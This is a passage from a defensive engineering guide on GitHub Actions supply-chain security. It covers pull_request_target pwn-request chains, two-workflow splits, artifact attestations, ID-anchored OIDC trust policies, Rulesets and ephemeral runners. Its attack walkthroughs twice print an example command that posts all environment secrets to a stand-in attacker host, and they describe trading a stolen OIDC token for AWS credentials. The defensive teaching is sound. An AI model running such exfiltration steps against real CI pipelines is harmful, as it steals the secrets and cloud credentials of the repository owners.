2. **Attacker opens a PR against your `main` branch** from their fork. Their PR body looks like a friendly bug fix; their `head.sha` points at their malicious commit.
3. **Your workflow triggers on `pull_request_target`.** Unlike `pull_request` (which runs in the *fork's* context with no secrets and read-only `GITHUB_TOKEN`), `pull_request_target` runs in **your base repo's context** with full `GITHUB_TOKEN` permissions and access to every secret the workflow can see. This trigger exists for legitimate label-bot / auto-merge use cases that need write access to PRs, but it's a loaded gun.
4. **The workflow checks out the PR head SHA**: `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}`. The attacker's malicious code is now in the runner's workspace, running with **your base repo's secrets and a write-capable `GITHUB_TOKEN`**.
5. **The attacker exfiltrates and escalates.** A single line in their malicious `package.json` postinstall script -- `curl -X POST evil.example.com -d "$(env)"` -- ships every secret the workflow injected to the attacker's server. With the workflow's `id-token: write` permission, they can also request the OIDC token directly (`$ACTIONS_ID_TOKEN_REQUEST_URL`) and trade it for AWS creds whose `sub:` claim is byte-identical to a legitimate `main`-branch push, defeating any trust-policy gate that checks `sub:ref:refs/heads/main` (because that's exactly the trigger's claim).

The composed-defense matrix -- any single layer holding stops the chain:

| Layer | What it does | Why it stops the chain |
|-------|-------------|-----------------------|
| Use `pull_request`, not `pull_request_target` | Runs in fork context | No base-repo secrets in scope; `GITHUB_TOKEN` is read-only |
| `permissions: contents: read` at workflow level | Default to read-only `GITHUB_TOKEN` | Even if the workflow runs, it cannot write to the repo |
| `id-token: write` at JOB level, NOT workflow level | OIDC token request scoped to one job | The drive-by-modified application step in a different job cannot request OIDC |
| Environment protection rules with required reviewers | Secrets gated behind human approval | The PR-triggered job cannot inject env secrets without a reviewer approving |
| OIDC trust policy on `sub:environment:production`, NOT `sub:ref:refs/heads/main` | AWS only mints prod creds for env-scoped triggers | A `pull_request_target`-triggered run cannot match an environment-scoped sub |
| Two-workflow split: trusted base workflow + untrusted PR workflow | Untrusted PR code never runs in `_target` context | The label-bot needs in `pull_request_target` are decoupled from anything that runs PR code |

The right pattern when you genuinely need write access to a PR (label-bot, auto-comment, auto-merge of Dependabot): keep `pull_request_target` confined to a workflow that **never checks out PR-author code**. Never `actions/checkout` the `head.sha`; never run `npm install` (which executes `postinstall` from PR-author `package.json`); never run any tool whose input is PR-author-controlled. If the workflow body reads "checkout `head.sha`, then run something that executes the checked-out code," it's a pwn-request waiting to happen.

**The two-workflow split is the production-correct pattern for label-bots / auto-comment / auto-merge:**

```
W1: compute-labels.yml
  on: pull_request                  <-- fork context: no secrets, read-only GITHUB_TOKEN
  permissions: contents: read
  steps:
    - actions/checkout              <-- fork code is fine here, can't do harm
    - run labeler/analyzer logic
    - upload labels.json + pr_number.txt as artifact

         |
         v   (artifact crosses the trust boundary as DATA, never as CODE)
         |

W2: apply-labels.yml
  on: workflow_run                  <-- fires after W1 completes
    workflows: [compute-labels.yml]
    types: [completed]
  permissions:
    pull-requests: write
    id-token: write
  environment: production            <-- real reviewer gate; NO fork code in scope here
  steps:
    - download artifact from W1
    - DEFENSIVELY PARSE the artifact:
        * pr_number must be a positive integer
        * labels must each match an allowlist regex (^(docs|frontend|backend)$)
        * reject anything else and exit nonzero
    - apply labels via gh API
    - emit Datadog metric
```

The trust-boundary axiom: **the artifact is data, never code.** Fork code ran in W1 (which has nothing to steal); secrets and write permissions live in W2 (which never executes fork code). The artifact is the only thing crossing the boundary, and W2 treats it as untrusted JSON -- validates the schema, enforces an allowlist on every field, and aborts on any unexpected shape. Without this defensive parse, a malicious W1 (where fork code DID run) could write a `labels.json` with shell-injection payload strings in label names, or set `pr_number` to point at a different repo's PR entirely. The defensive parse is what makes the boundary actually a boundary.

How to know which files changed without checking out fork code (the most common reason engineers reach for `pull_request_target` + checkout): use the **REST API**, which returns parsed metadata without executing any fork code:

```bash
gh api repos/${{ github.repository }}/pulls/${{ github.event.pull_request.number }}/files \
  --jq '.[].filename'
```

This returns paths, additions, deletions, and patch status for every file in the PR. For directory-prefix labeling (`frontend/` vs `backend/`), that's all you need. If you genuinely need *content* analysis (e.g., AST diff to detect breaking API changes), that work belongs inside W1 where fork code is sandboxed and the *output* is the verdict, not the input. Never reach for `pull_request_target` + checkout-the-head to solve a "which files changed" problem -- the metadata API and `dorny/paths-filter` (SHA-pinned) cover every case that doesn't involve running PR-author code.

The byte-identical-sub trap is the most insidious part. An attacker's `pull_request_target` run mints an OIDC token whose `sub` claim is `repo:my-org/my-repo:ref:refs/heads/main` (because the trigger runs in the base repo's main-branch context, NOT in the PR's branch). A naive AWS trust policy that gates on `sub:ref:refs/heads/main` cannot distinguish this from a legitimate main-branch push. The correct defense is to **scope OIDC trust policies on `sub:environment:X`** (which `pull_request_target` cannot fake without GitHub's environment protection rules firing), or on `job_workflow_ref` (the strongest claim, pins to the exact workflow file path that minted the token).

This is the parallel attack chain to the self-hosted runner footgun. Both rely on attacker code running with your credentials; both are defeated by layering. Both have killed real production estates in the last 36 months.

### Reusable workflow vs third-party-action trust model

Decision rule: **the more critical the action is to your security boundary, the more you should fork+vendor it**.

| Action category | Trust strategy |
|-----------------|----------------|
| GitHub-published (`actions/checkout`, `actions/setup-*`) | SHA-pin, trust upstream maintainer |
| Verified Creator org (Docker, AWS, HashiCorp, Sigstore) | SHA-pin, trust upstream maintainer with high confidence -- but note: verified orgs have been compromised too (2024 Marketplace incidents) |
| Popular community action by individual maintainer (peter-evans, tj-actions before CVE-2025-30066, dorny) | SHA-pin + cooldown + review every Dependabot PR -- no badge protects against maintainer-credential phishing |
| Niche/small-maintainer action | Fork to your org, SHA-pin to your fork, manually merge upstream changes |
| Critical-path security action (signing, attestation, scanning) | Fork + vendor; review every upstream change line-by-line before merging |

The "Verified Creator" badge is a Marketplace signal for **organizations** enrolled in GitHub's Technology Partner Program (AWS, Docker, HashiCorp, Sigstore, and similar). It tells you GitHub has confirmed the publishing org's identity -- it does NOT tell you the action is immune to supply chain attacks, and crucially, **most popular community actions don't have it at all**. `tj-actions/changed-files` was published by an individual maintainer, not a Verified Creator org -- and CVE-2025-30066 happened anyway, because popularity and maintainer reputation are not the same as the badge, and the badge is not the same as immunity to credential theft. Even Verified Creator orgs have had maintainer credentials phished (the 2024 GitHub Actions Marketplace incidents touched multiple verified publishers). The takeaway: the badge raises confidence by a small margin; SHA pinning is still the only control that defeats the entire class.

---

## Part 5: Artifact Attestations -- Beyond Cosign Signing

May 7 covered Cosign keyless signing: at build time, `cosign sign --yes IMAGE@DIGEST` signs the image digest using Sigstore's Fulcio (CA), Rekor (transparency log), and the workflow's OIDC identity. The result is a wax seal on the box -- proof that the same OIDC identity that built the image signed its bytes.

Artifact attestations go a layer further: they capture **provenance**, not just signature. A signed attestation says *which workflow*, *which commit*, *which branch*, *which builder image*, *which build steps* produced this artifact. The cosign signature says "the bytes are these"; the attestation says "the bytes came from this exact build event."

### The `attest-build-provenance` action

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      id-token: write       # OIDC for Sigstore
      contents: read
      packages: write        # ECR push
      attestations: write    # NEW: writes attestation to GitHub's API
    outputs:
      digest: ${{ steps.build.outputs.digest }}

    steps:
      - uses: actions/checkout@a5ac7e51b41094c92402da3b24376905380afc29 # v4.1.1

      - uses: docker/setup-buildx-action@988b5a0280414f521da01fcc63a27aeeb4b104db # v3.6.1

      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: ${{ vars.AWS_ECR_PUSH_ROLE }}
          aws-region: us-east-1

      - id: ecr-login
        uses: aws-actions/amazon-ecr-login@062b18b96a7aff071d4dc91bc00c4c1a7945b076 # v2.0.1

      - id: build
        uses: docker/build-push-action@5176d81f87c23d6fc96624dfdbcd9f3830bbe445 # v6.5.0
        with:
          context: .
          push: true
          tags: ${{ vars.IMAGE_REPO }}:${{ github.sha }}
          provenance: mode=max
          sbom: true

      # 1. Cosign keyless signing (covered May 7) -- "wax seal on the bytes"
      - uses: sigstore/cosign-installer@4959ce089c2fe283b1beed9b2b683f9b54fd77ba # v3.6.0
      - name: Cosign sign by digest
        env:
          IMG: ${{ vars.IMAGE_REPO }}@${{ steps.build.outputs.digest }}
        run: cosign sign --yes "$IMG"

      # 2. GitHub-native build provenance attestation -- "notarized shipping manifest"
      # NOTE: v4 is current as of 2026 (v4 is a thin wrapper over `actions/attest`).
      # For new workflows, `actions/attest` directly is the forward path; v4 of
      # `attest-build-provenance` remains the convenience entry point with sensible
      # SLSA defaults. Resolve the current SHA with:
      #   gh api repos/actions/attest-build-provenance/releases/latest --jq .target_commitish
      - uses: actions/attest-build-provenance@7668571508540a607bdfd90a87a560489fe372eb # v4.0.0
        with:
          subject-name: ${{ vars.IMAGE_REPO }}
          subject-digest: ${{ steps.build.outputs.digest }}
          push-to-registry: true   # also push to the OCI registry as an OCI artifact

      # 3. SBOM attestation -- "ingredients list, notarized"
      - uses: actions/attest-sbom@115c3be05ff3974bcbd596578934b3f9ce39bf68 # v3.0.0
        with:
          subject-name: ${{ vars.IMAGE_REPO }}
          subject-digest: ${{ steps.build.outputs.digest }}
          sbom-path: ./sbom.spdx.json
```

What lands where:

- **Cosign signature** -> stored in the OCI registry alongside the image (`<image>:sha256-<digest>.sig`) AND in Sigstore's Rekor transparency log.
- **GitHub attestation** -> stored under the repo's "Attestations" tab (via GitHub's REST API) AND optionally pushed to the OCI registry as an OCI artifact (with `push-to-registry: true`) AND written to Sigstore's transparency log.

Both are signed by the **same OIDC identity** -- `https://github.com/my-org/my-repo/.github/workflows/release.yml@refs/heads/main` -- so verifying either tells you the same identity built the artifact. The difference is what's *in* the signed payload:
- **Cosign payload** = "this digest"
- **Attestation payload** = "this digest, built by this workflow, on this branch, from this commit, by this runner image, at this timestamp"

### SLSA v1.0 Build Level 2 -- what's in the provenance

The attestation conforms to SLSA v1.0 (per GitHub's docs, currently certifies to Build Level 2 -- single-tenant build platform, signed provenance). The signed in-toto statement contains:

```json
{
  "_type": "https://in-toto.io/Statement/v1",
  "subject": [{
    "name": "123456789012.dkr.ecr.us-east-1.amazonaws.com/myapp",
    "digest": { "sha256": "a5ac7e51b41094c92402da3b24376905380afc29..." }
  }],
  "predicateType": "https://slsa.dev/provenance/v1",
  "predicate": {
    "buildDefinition": {
      "buildType": "https://actions.github.io/buildtypes/workflow/v1",
      "externalParameters": {
        "workflow": {
          "ref": "refs/heads/main",
          "repository": "https://github.com/my-org/my-repo",
          "path": ".github/workflows/release.yml"
        }
      },
      "resolvedDependencies": [{
        "uri": "git+https://github.com/my-org/my-repo@refs/heads/main",
        "digest": { "gitCommit": "abc123..." }
      }]
    },
    "runDetails": {
      "builder": {
        "id": "https://github.com/actions/runner/github-hosted"
      },
      "metadata": {
        "invocationId": "https://github.com/my-org/my-repo/actions/runs/12345/attempts/1"
      }
    }
  }
}
```

Read this as the chain-of-custody log: workflow `release.yml` on branch `main` at commit `abc123` running on a `github-hosted` runner produced this `sha256:a5ac...` artifact in run `12345`. Tamper with any of those fields and the signature fails verification.

### Verification with `gh attestation verify`

```bash
# Pull the image, then verify
IMG="123.dkr.ecr.us-east-1.amazonaws.com/myapp@sha256:a5ac..."

# Verify the attestation exists AND matches policy
gh attestation verify "oci://$IMG" \
  --owner my-org \
  --signer-workflow my-org/my-repo/.github/workflows/release.yml \
  --signer-repo my-org/my-repo

# Same check on a tarball (e.g. before pushing to a different registry)
gh attestation verify ./myapp.tar \
  --owner my-org \
  --signer-workflow my-org/my-repo/.github/workflows/release.yml@refs/heads/main
```

The `--signer-workflow` and `--owner` flags are the policy: "this artifact must have been built by this exact workflow file at this exact ref, by this exact org." A compromised CI that builds the image in `release-attacker.yml` instead of `release.yml` fails this gate. An image built from a feature branch fails this gate (no `refs/heads/main` match). An image built by a different org fails this gate. The single command is the customs officer for your deploys.

### The two-attestation pattern

Why have both Cosign signing and GitHub-native attestations? They're complementary, not redundant:

| Question | Cosign answers | Attestation answers |
|----------|----------------|---------------------|
| "Are these the bytes signed by my CI identity?" | YES (signature on digest) | YES (signature wraps subject digest) |
| "Which workflow/branch/commit built these bytes?" | NO (just identity) | YES (full SLSA provenance) |
| "Can a Kubernetes admission webhook block unsigned images?" | YES (Sigstore policy-controller, Kyverno `verifyImages`) | YES (Kyverno can read attestations too) |
| "Is this written to Sigstore Rekor for tamper-evident transparency?" | YES | YES |
| "Is this discoverable via the GitHub UI / `gh attestation list`?" | NO | YES |
| "Does the upstream image registry hold it?" | YES (OCI artifact) | YES with `push-to-registry: true` |

The two-signature pattern means: any verifier (Cosign-aware OR attestation-aware) can prove the OIDC identity; only the attestation verifier can additionally prove the workflow context. SLSA-conscious deploy pipelines verify both; legacy verifiers that only know Cosign still get useful signal.

### What attestations DO NOT claim -- the behavioral-correctness gap

Attestations bind a digest to its build context: this workflow, this branch, this commit, this builder image, these resolved dependencies. **They make no claim about whether the resulting image actually functions.** A clean, signed, attested image with a benign upstream-dependency regression -- a `docker/build-push-action` minor bump that silently changes cache-key composition and strips a critical build argument, a `actions/setup-node` patch that defaults to a different Node ABI, a base-image rebuild that changes a system library's behavior -- will pass every claim in every predicate and admit cleanly into the cluster, then `CrashLoopBackOff` 90 seconds later.

This is the **behavioral verification gap**, and it's a different class of failure from anything the eight Phase 2.7 gates cover:

| Failure class | Caught by |
|---------------|-----------|
| Malicious vendor (tj-actions) | SHA pinning, Dependabot cooldown, Harden-Runner egress |
| Compromised insider PR | CODEOWNERS + Rulesets + signed commits + audit log |
| Leaked credentials | OIDC short-lived creds + env-scoped secrets |
| Runner compromise | Ephemeral runners + minimal host IAM |
| Cross-workflow signing (Q3) | Tightened Cosign SAN + attestation predicate matching |
| Audit-trail tampering | SIEM export with 2-year retention |
| Platform-side drift (April 23 2026 sub format) | Shadow-assume synthetic monitor + ID-based trust policies |
| **Benign regression in legitimate upstream** | **NOT covered by any of the above** |

The fix is **not more attestation surface** -- you cannot cosign-sign your way to functional correctness. The fix is a **behavioral gate** added in parallel: a smoke-test step in `release.yml` that runs the freshly-built image, exercises its healthcheck endpoint, and fails the workflow before sign/push if the image cannot reach Ready state within N seconds. Pair this with a **canary rollout strategy** (Argo Rollouts or Flagger) at the deploy layer that promotes the new digest to one pod at a time and rolls back automatically on healthcheck failure -- so the worst case is one failed pod for 60 seconds, not all pods for 38 minutes.

```yaml
# In release.yml, after build but BEFORE Cosign sign + push:
- name: Pre-promotion smoke test
  env:
    IMG: ${{ env.IMAGE_REPO }}:${{ github.sha }}
  run: |
    docker pull "$IMG"
    docker run -d --name smoke -p 8080:8080 "$IMG"
    for i in {1..30}; do
      sleep 2
      if curl -fsS http://localhost:8080/healthz > /dev/null; then
        echo "Healthy after ${i} attempts"
        docker stop smoke
        exit 0
      fi
    done
    echo "Image failed to reach Ready in 60s"
    docker logs smoke
    docker stop smoke || true
    exit 1
```

The ~30-second cost per build is the floor price of behavioral verification. Combined with canary rollouts at the CD layer, this closes the failure-class gap without contradicting Q3's design or undoing any provenance gate. **Attestations + behavioral gate is the complete defense**: provenance proves *who* built and *how*; the smoke test proves *whether it works*.

The senior framing of this distinction: **every security gate has a named scope, and every architecture has a named gap.** The mature security engineer's job is not building more gates -- it is *naming what each gate doesn't claim* and deciding whether the gap warrants a complementary control. Q3's design was sufficient for the malicious-vendor threat model it was scoped to. The November 12 2026 (hypothetical post-mortem) incident demonstrated that benign-regression is a different scope. The right action item is the behavioral gate -- not a second-guessing of the provenance gates.

### The April 23, 2026 immutable subject claims update

GitHub announced on **April 23, 2026** an opt-in (becoming default for new and transferred repos on **June 18, 2026**) update to OIDC token subject claims: **the `repository` and `repository_owner` fields are augmented with the numeric repo ID and org ID** so that renames and transfers no longer invalidate downstream trust policies. The new sub format:

```
# Old (mutable) format
repo:my-org/my-repo:ref:refs/heads/main
repo:my-org/my-repo:environment:production

# New (immutable) format -- repo ID + org ID appended
repo:my-org-123456/my-repo-456789:ref:refs/heads/main
repo:my-org-123456/my-repo-456789:environment:production
```

**Why this matters as a security control**: an attacker who manages to register a same-named org or repo after a rename/transfer can no longer impersonate the original. Today, a trust policy gated on `repo:my-org/my-repo:*` would happily accept a token from a re-registered `my-org/my-repo` that an attacker created after you transferred or renamed away from that path. With the immutable format, the numeric IDs are permanent identifiers that an attacker cannot reuse.

**The forward-compatibility headache during the transition window**: trust policies and Kyverno subject regexes that anchor to the *old* format (`repo:my-org/my-repo:*`) will silently stop matching tokens minted in the *new* format. Conversely, policies that only accept the new format won't match repos that haven't yet been migrated.

**The structurally-correct fix is NOT to dual-list both sub formats. It's to anchor on the always-immutable separate token claims** (`repository_id` and `repository_owner_id`) that GitHub has minted since 2022, alongside the existing claims. These are numeric primary-key IDs that:

- Survive **renames** (rename `my-repo` to `payments-service` -- IDs unchanged)
- Survive **transfers** (move from `legacy-acme` to `acme-corp` -- IDs unchanged)
- Are **unspoofable** -- nobody else can re-register a repo with the same numeric ID after you've transferred it away
- **Survive future `sub` template changes** -- the April 23 2026 update is unlikely to be the last; anchoring on `sub` shape is anchoring on a moving target

```json
// CORRECT: anchor on immutable numeric IDs; sub claim scopes to environment only
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::123:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:repository_id":       "456789",
        "token.actions.githubusercontent.com:repository_owner_id": "123456"
      },
      "StringLike": {
        "token.actions.githubusercontent.com:sub": "*:environment:production*"
      }
    }
  }]
}
```

What this buys: the IDs do the actual identity binding; the sub wildcard just scopes to the production environment. Survives the April 23 2026 transition without modification; survives whatever GitHub does to the sub template in 2027; survives every rename and transfer of the repo. **You don't need to opt in to the new sub format and you don't need to know which format your repo is currently emitting** -- both formats include `repository_id` and `repository_owner_id` as separate claims unchanged.

Find the numeric IDs with one API call (run once during policy authoring):

```bash
gh api repos/my-org/my-repo --jq '{repo_id: .id, owner_id: .owner.id}'
# => { "repo_id": 456789, "owner_id": 123456 }
```

**The hygiene risk this trades for**: if the policy is copy-pasted to another role and the immutable IDs aren't updated, the wildcard sub lets any production-env workflow in the wrong repo match. The mitigation is to keep the IDs in Terraform variables (per role) and code-review for ID-update on every new-role PR.

**The fallback dual-list approach** (for situations where you can't easily look up the numeric IDs -- legacy SaaS systems whose OIDC verifier only inspects `sub`):

```json
// FALLBACK: only when ID-based anchoring isn't available in the verifier
{
  "Condition": {
    "StringLike": {
      "token.actions.githubusercontent.com:sub": [
        "repo:my-org/my-repo:environment:production",
        "repo:my-org-123456/my-repo-456789:environment:production"
      ]
    }
  }
}
```

```yaml
# Kyverno keyless verifier (which inspects the SAN, not the underlying claims):
# regex match BOTH formats during transition, tighten to one once migration completes
attestors:
  - entries:
      - keyless:
          subject: |
            https://github.com/my-org(-[0-9]+)?/my-repo(-[0-9]+)?/.github/workflows/release.yml@refs/heads/main
```

The Cosign/Sigstore verifier inspects the cert SAN (which mirrors the sub claim) rather than separate token claims, so for *admission-time* verification you do need the regex-both-formats approach during the transition window. For *AWS / GCP / Azure / Vault* trust policies, prefer ID-based anchoring.

**The senior-IC framing**: when a platform offers both a mutable name and an immutable ID for the same entity, **always anchor on the ID**. This principle generalizes -- it's how you write durable DNS entries, durable S3 ARN policies, durable Kubernetes RBAC bindings. The mutable name is the human convenience layer; the ID is the security boundary.

If you must dual-list sub formats during the transition (Cosign/Sigstore admission case):
1. **Today (May 11)**: update every Kyverno verify rule + `gh attestation verify --signer-workflow` regex to accept BOTH formats; for AWS/GCP/Azure trust policies, **pivot to ID-based StringEquals**.
2. **After June 18, 2026**: new and transferred repos default to the new format. Confirm your prod repos have opted in via `Settings -> Actions -> General -> OIDC token customization`.
3. **Once your estate is fully migrated**: tighten the Cosign-side regex to the new-format-only pattern; ID-based trust policies need no change.

The silent-failure mode if you skip step 1 *and* your trust policy is sub-anchored: the next repo to default to the new format silently breaks every deploy whose trust policy is anchored to the old `sub`. The diagnostic is "workflow ran, token was minted, AWS rejected with `AccessDenied`" -- decoded only by inspecting the CloudTrail `userIdentity.webIdFederationData.attributes` block to see the actual sub claim that arrived. (See Part 9 for the corrected Athena query.)

### Kubernetes admission gate -- closing the loop with ArgoCD (ties back to May 10)

In the cluster, **Kyverno `verifyImages`** or **Sigstore policy-controller** at the admission layer verifies both:

```yaml
# Kyverno policy (cluster-scoped) - admit only images signed AND attested by your workflow
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-cosign-and-attestation
spec:
  validationFailureAction: Enforce
  rules:
    - name: require-attestation-from-release-workflow
      match:
        any:
          - resources:
              kinds: [Pod]
      verifyImages:
        - imageReferences:
            - "123.dkr.ecr.us-east-1.amazonaws.com/myapp:*"
          attestors:
            - entries:
                - keyless:
                    subject: "https://github.com/my-org/my-repo/.github/workflows/release.yml@refs/heads/main"
                    issuer: "https://token.actions.githubusercontent.com"
                    rekor:
                      url: "https://rekor.sigstore.dev"
          attestations:
            - type: "https://slsa.dev/provenance/v1"
              attestors:
                - entries:
                    - keyless:
                        subject: "https://github.com/my-org/my-repo/.github/workflows/release.yml@refs/heads/main"
                        issuer: "https://token.actions.githubusercontent.com"
              conditions:
                - all:
                    - key: "{{ buildDefinition.externalParameters.workflow.ref }}"
                      operator: Equals
                      value: "refs/heads/main"
```

When ArgoCD (May 10) tries to deploy a Pod with an image, Kyverno intercepts at admission, fetches the signature and attestation from Sigstore, verifies the OIDC subject claim matches your release workflow on `main`, and either admits or rejects the Pod. **The cluster is the policy enforcement point**; CI is the producer; ArgoCD is the deployer. SLSA Level 3 in practice.

---

## Part 6: Branch Protection -- Rulesets vs Classic

The vault-door procedure manual got rewritten in 2023-2024. If you're on the old manual, you're maintaining a relic; the new manual does more, composes better, and is the only one GitHub is investing in.

### Why Rulesets win

| Capability | Classic branch protection | Rulesets |
|------------|---------------------------|----------|
| Multiple rules on same branch | Only one rule matches (overlap = confusion) | Rules compose additively, most-restrictive wins |
| Target tags | No | Yes (`v*` tag rulesets) |
| Target pushes | No | Yes |
| Status check matching | Exact string only (`build` vs `build (ubuntu-latest)` differs) | Smart matching by integration source (the App/Action that posted the check) |
| Org-level enforcement | No (per-repo only) | Yes (org-level rulesets apply to all repos) |
| Bypass actors with audit | Limited (admin bypass is binary) | Granular: specific users/teams/apps + bypass mode (Always vs Pull request only) + audit-logged |
| Required deployments | No | Yes -- "must deploy to dev successfully before merging to main" |
| Layered enforcement (repo + org) | No | Yes -- repo rules add to org rules |

The 2026 default for new repos is Rulesets; classic branch protection is in long-term maintenance mode. If you find yourself in a UI that says "Branches -> Add rule" you're in the legacy interface -- migrate to "Rules -> Rulesets."

### The canonical `main`-branch ruleset

```jsonc
// POST /repos/{owner}/{repo}/rulesets
{
  "name": "main-branch-protection",
  "target": "branch",
  "enforcement": "active",
  "conditions": {
    "ref_name": {
      "include": ["refs/heads/main"],
      "exclude": []
    }
  },
  "bypass_actors": [
    {
      "actor_id": 12345,             // ID of breakglass team
      "actor_type": "Team",
      "bypass_mode": "pull_request"   // PR-only, NOT "always"
    }
  ],
  "rules": [
    { "type": "deletion" },
    { "type": "non_fast_forward" },
    {
      "type": "required_linear_history"
    },
    {
      "type": "required_signatures"
    },
    {
      "type": "pull_request",
      "parameters": {
        "required_approving_review_count": 2,
        "dismiss_stale_reviews_on_push": true,
        "require_code_owner_review": true,
        "require_last_push_approval": true,
        "required_review_thread_resolution": true
      }
    },
    {
      "type": "required_status_checks",
      "parameters": {
        "strict_required_status_checks_policy": true,
        // integration_id pins the check to a SPECIFIC poster (App/Action) so
        // a different App posting a green check with the same name CANNOT
        // satisfy the rule. 15368 is the GitHub Actions integration ID on
        // github.com -- look up your own integrations with:
        //   gh api /repos/{owner}/{repo}/installations
        // and use the matching App's id (Buildkite, CircleCI, etc.).
        "required_status_checks": [
          { "context": "lint",   "integration_id": 15368 },
          { "context": "test",   "integration_id": 15368 },
          { "context": "build",  "integration_id": 15368 },
          { "context": "security-scan", "integration_id": 15368 }
        ]
      }
    },
    {
      "type": "required_deployments",
      "parameters": {
        "required_deployment_environments": ["dev"]
      }
    }
  ]
}
```

Key choices:

- **`bypass_mode: pull_request`**, NOT `always`. "Always" mode lets the bypass actor commit directly to main with no PR -- a backdoor that an attacker who compromises that actor can use to inject any commit. "Pull request only" means even the bypass actor must open a PR; they can merge without all checks passing, but every change is at least visible as a PR.
- **`require_code_owner_review: true`**: enforces CODEOWNERS. Without this, CODEOWNERS is just a hint.
- **`required_linear_history`**: forbids merge commits on main. Forces squash or rebase. Makes `git log` readable and `git revert` deterministic.
- **`required_deployments: ["dev"]`**: the deploy-to-dev-first rule. A PR can't merge to main until ArgoCD has successfully deployed it to the dev environment. Belt-and-suspenders with the GitHub Environments protection.

### The "skipped is not success" trap

This is the most common Rulesets gotcha. Suppose your workflow has:

```yaml
jobs:
  test-backend:
    if: contains(github.event.pull_request.changed_files, 'backend/')
    runs-on: ubuntu-latest
    steps: [...]
```

And your Ruleset requires `test-backend` as a status check. A PR that only touches `frontend/` doesn't trigger `test-backend` -- the job is *skipped*. **A skipped status check is not the same as a successful one** -- the PR is now permanently blocked because the required check never reported success. This is correct security behavior (an attacker can't bypass checks by adding path filters that make them not run), but it's an operational footgun.

The fix is the **status-aggregator-job pattern**:

```yaml
jobs:
  test-backend:
    if: contains(github.event.pull_request.changed_files, 'backend/')
    runs-on: ubuntu-latest
    steps: [...]

  test-frontend:
    if: contains(github.event.pull_request.changed_files, 'frontend/')
    runs-on: ubuntu-latest
    steps: [...]

  # Required-check target: this always runs and aggregates the others
  all-tests-pass:
    if: always()    # CRITICAL -- runs even if upstream jobs are skipped
    needs: [test-backend, test-frontend]
    runs-on: ubuntu-latest
    steps:
      - name: Verify upstream jobs succeeded or were skipped
        run: |
          # success or skipped are both OK; failure or cancelled are not
          [[ "${{ needs.test-backend.result }}" =~ ^(success|skipped)$ ]] || exit 1
          [[ "${{ needs.test-frontend.result }}" =~ ^(success|skipped)$ ]] || exit 1
```

Set the Ruleset to require **`all-tests-pass`** (not the individual jobs). It always runs, it always reports a status, and it correctly fails if any required upstream job failed (vs being skipped). Covered May 6 in the composite-actions doc -- this is its production-correct realization.

### Tag rulesets -- protecting downstream SHA-pinners

```jsonc
{
  "name": "release-tag-immutability",
  "target": "tag",
  "enforcement": "active",
  "conditions": {
    "ref_name": {
      "include": ["refs/tags/v*"],
      "exclude": []
    }
  },
  "bypass_actors": [],   // nobody can rewrite a v* tag
  "rules": [
    { "type": "deletion" },              // forbids `git push --delete origin v1.2.3`
    { "type": "non_fast_forward" },      // forbids `git tag -f v1.2.3 abc123 && git push --force`
    { "type": "creation" }                // gating tag creation; pair with a workflow that
                                          // requires release-PR approval before tagging
  ]
}
```

Why this matters even if you don't release a public action: **anyone who SHA-pins to your tag is trusting that the tag never moves.** If your tag rulesets allow non-fast-forward pushes, an attacker who compromises a maintainer can repoint `v1.2.3` to a malicious commit, and downstream consumers who pinned `@a5ac... # v1.2.3` will eventually `pinact run` to update the comment and may inadvertently pull the new (malicious) SHA. Immutable tags via rulesets close this loop.

---

## Part 7: Runners -- The Armored Truck Fleet

The armored truck drivers must be vetted, must drive single-trip vehicles, and must never operate in public alleys. This is the runner security model.

### Self-hosted runner on public repo: NEVER

A self-hosted runner attached to a public repository is **arbitrary code execution as a service**. Walk through the attack:

1. Attacker forks your public repo.
2. Attacker opens a PR that modifies `.github/workflows/ci.yml` to add a step: `run: curl -X POST evil.example.com -d "$(env)"`.
3. The PR triggers your CI on the self-hosted runner. The runner now has the attacker's code in its workspace.
4. The runner's process has whatever ambient credentials the host has -- AWS instance profile, kubelet creds, GCP service account, SSH keys to internal services. The attacker exfiltrates all of them.
5. If the runner is non-ephemeral, the attacker can plant a cron job, a modified shell rc, or a process that survives the workflow's end -- *every subsequent job* on that runner now runs alongside attacker code.

GitHub's own docs say this explicitly: **do not attach self-hosted runners to public repositories**. The only safe configurations for public repos are GitHub-hosted runners (which are ephemeral by design) or larger hosted runners.

### Ephemeral runners -- the only acceptable production posture

Even on private repos, **never run persistent (non-ephemeral) self-hosted runners in production.** A non-ephemeral runner is a long-lived host that accepts many jobs over its lifetime; secrets-on-disk from job N can be read by job N+1; a compromise on any job persists.

The runner agent supports `--ephemeral` mode:

```bash
# Single-job runner -- terminates after one job completes
./config.sh --url https://github.com/my-org/my-repo \
  --token "$JIT_TOKEN" \
  --ephemeral \
  --unattended \
  --replace

./run.sh   # blocks on one job, then exits
```

The runner process exits after one job, and your supervisor (systemd, ARC, EC2 Auto Scaling group with terminate-on-task-complete) replaces it. There is no inter-job state. There is no lateral-movement target. This is the only production-correct posture.

### Actions Runner Controller (ARC) -- ephemeral on Kubernetes

ARC is GitHub's official Kubernetes-native runner controller. The architecture:

```
+----------------------+
| ARC Controller       |   <- watches AutoscalingRunnerSet CRDs
| (cluster-scoped)     |       reconciles to desired runner count
+----------+-----------+
           |
           v
+----------------------+   <- one per workload class
| AutoscalingRunnerSet |       (linux-x64, linux-arm64, gpu, etc.)
+----------+-----------+
           |
           v
+----------------------+   <- talks to GitHub's API
| Listener             |       requests jobs, mints JIT tokens
+----------+-----------+
           |
           | spawns
           v
+----------------------+
| EphemeralRunner Pod  |   <- single-job; deleted after job
+----------------------+
```

Sample `AutoscalingRunnerSet`:

```yaml
apiVersion: actions.github.com/v1alpha1
kind: AutoscalingRunnerSet
metadata:
  name: my-org-runners
  namespace: arc-runners
spec:
  runnerScaleSetName: my-org-runners
  githubConfigUrl: https://github.com/my-org   # org-level
  githubConfigSecret: gh-app-credentials       # GitHub App, not PAT
  minRunners: 0      # scale-from-zero
  maxRunners: 50
  runnerGroup: default
  template:
    spec:
